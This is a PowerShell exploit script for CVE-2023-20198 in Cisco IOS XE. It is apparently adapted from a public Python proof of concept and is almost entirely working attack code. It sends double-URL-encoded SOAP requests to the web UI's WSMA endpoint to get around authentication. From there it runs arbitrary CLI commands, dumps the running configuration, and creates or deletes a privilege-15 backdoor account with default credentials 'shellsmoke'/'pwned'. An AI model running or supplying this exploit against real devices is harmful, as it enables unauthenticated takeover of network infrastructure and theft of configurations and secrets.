# PowerShell script for exploiting Cisco IOS XE (CVE-2023-20198) based on https://github.com/smokeintheshell/CVE-2023-20198/blob/main/exploit.py
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetIP,

    [Parameter(Mandatory = $true)]
    [ValidateSet('CheckVuln', 'GetConfig', 'ExecCmd', 'AddUser', 'DelUser')]
    [string]$Mode,

    [Parameter(Mandatory = $false)]
    [string]$Command,

    [Parameter(Mandatory = $false)]
    [string]$Username = "shellsmoke",

    [Parameter(Mandatory = $false)]
    [string]$Password = "pwned",

    [Parameter(Mandatory = $false)]
    [switch]$UseHttps = $false,

    [int]$Port = 80,

    [Parameter(Mandatory = $false)]
    [switch]$VerboseOutput,

    [Parameter(Mandatory = $false)]
    [string]$OutputFile
)

# Logging Setup
$LogLevel = if ($VerboseOutput) { "Debug" } else { "Info" }
function Log {
    param (
        [string]$Message,
        [string]$Level = "Info"
    )
    if ($Level -eq "Error" -or $Level -eq $LogLevel -or $LogLevel -eq "Debug") {
        Write-Output "$($Level): $Message"
    }
}

# Set protocol scheme
$Scheme = "http"

$TargetUrl = "http://${TargetIP}:80/%2577eb%2575i_%2577sma_Http"

# SOAP Templates
$ExecCmdTemplate = @"
<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP:Header>
<wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
<wsse:UsernameToken SOAP:mustUnderstand="false">
<wsse:Username>admin</wsse:Username>
<wsse:Password>*****</wsse:Password>
</wsse:UsernameToken>
</wsse:Security>
</SOAP:Header>
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-exec">
<execCLI xsd="false">
<cmd>{0}</cmd>
<dialogue>
<expect>
</expect>
<reply>
</reply>
</dialogue>
</execCLI>
</request>
</SOAP:Body>
</SOAP:Envelope>
"@

$AddUserTemplate = @"
<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP:Header>
<wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
<wsse:UsernameToken SOAP:mustUnderstand="false">
<wsse:Username>admin</wsse:Username>
<wsse:Password>*****</wsse:Password>
</wsse:UsernameToken>
</wsse:Security>
</SOAP:Header>
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-config">
<configApply details="all">
<config-data>
<cli-config-data-block>
{0}
</cli-config-data-block>
</config-data>
</configApply>
</request>
</SOAP:Body>
</SOAP:Envelope>
"@

# Create SOAP payload based on mode
switch ($Mode) {
    'ExecCmd' {
        if (-not $Command) {
            Write-Error "-Command parameter is required for ExecCmd mode"
            exit 1
        }
        $Payload = $ExecCmdTemplate -replace '\{0\}', $Command
    }
    'GetConfig' {
        $Payload = $ExecCmdTemplate -replace '\{0\}', "sh run"
    }
    'CheckVuln' {
        $Payload = $ExecCmdTemplate -replace '\{0\}', "uname -a"
    }
    'AddUser' {
        $UserConfig = "username $Username privilege 15 secret $Password"
        $Payload = $AddUserTemplate -replace '\{0\}', $UserConfig
    }
    'DelUser' {
        $UserConfig = "no username $Username privilege 15"
        $Payload = $AddUserTemplate -replace '\{0\}', $UserConfig
    }
    default {
        Write-Error "Unsupported mode"
        exit 1
    }
}









# Send Exploit
function Send-Exploit {
    param (
        [string]$Url,
        [string]$Body
    )

    try {
        $Headers = @{
            'Content-Type' = 'application/soap+xml; charset=utf-8'
            'User-Agent' = 'CVE-2023-20198'
        }
        $Response = Invoke-RestMethod -Uri $Url -Method Post -Headers $Headers -Body $Body
        return $Response
    }
    catch {
        Log "Failed to send exploit: $($_.Exception.Message)" "Error"
        if ($_.Exception.Response) {
            try {
                $responseStream = $_.Exception.Response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($responseStream)
                $responseBody = $reader.ReadToEnd()
                Log "Response Body: $responseBody" "Error"
            }
            catch {
                Log "Failed to read response body: $($_.Exception.Message)" "Error"
            }
        }
        return $null
    }
}

# Execute and log the result
Log "Target URL: $TargetUrl" "Debug"
Log "Payload: $Payload" "Debug"
$response = Send-Exploit -Url $TargetUrl -Body $Payload

if ($response -ne $null) {
    Log "Response Type: $($response.GetType().FullName)" "Debug"
    Log "Response received: $($response)" "Info"
    Log "Raw Response: $($response.OuterXml)" "Debug"
    try {
        if ($response -is [System.Xml.XmlDocument]) {
            $xmlContent = $response.OuterXml
            Log "Extracted XML Content: $xmlContent" "Debug"
            $responseText = $response.SelectSingleNode(".//received/text")
        }
        elseif ($response -is [string]) {
            $xmlResponse = [xml]$response
            $responseText = $xmlResponse.SelectSingleNode(".//received/text")
        } else {
            Log "Response is not a valid XML string." "Error"
            return
        }
        if ($responseText -ne $null) {
            Log "Command Output: $($responseText.InnerText)" "Info"
        }
    }
    catch {
        Log "Failed to parse XML response: $($_.Exception.Message)" "Error"
    }
    if ($OutputFile) {
        try {
            $response | Out-File -FilePath $OutputFile -Encoding utf8
            Log "Output saved to $OutputFile" "Info"
        }
        catch {
            Log "Failed to write output to file: $($_.Exception.Message)" "Error"
        }
    }
}
else {
    Log "No response received." "Error"
}
